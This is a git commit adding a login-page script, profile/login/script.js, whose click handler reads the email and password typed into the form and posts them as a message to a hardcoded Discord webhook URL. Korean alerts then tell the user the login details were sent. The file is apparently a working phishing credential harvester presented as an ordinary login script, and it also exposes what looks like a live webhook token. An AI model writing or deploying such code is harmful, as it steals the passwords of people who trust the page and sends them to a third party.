7f884685cfcdd869ed4b7ab9676000eee97f5d0a
7test357 <7test357@gmail.com>
2024-12-01 19:20:25 +0900

    Create script.js

---
+++ profile/login/script.js
@@ -0,0 +1,29 @@
+document.getElementById('login-button').addEventListener('click', function() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    const webhookURL = 'https://discord.com/api/webhooks/1312724758500216882/POMdK4RsYUMWFmYtpz81FE-xyPd4coVmBBCpix4jsQVCdL27avEBXS9ZMYnm2Kz7oc2p';
+
+    const data = {
+        content: `이메일: ${email}\n비밀번호: ${password}`
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('로그인 정보가 전송되었습니다.');
+        } else {
+            alert('전송 중 오류가 발생했습니다.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('전송 중 오류가 발생했습니다.');
+    });
+});
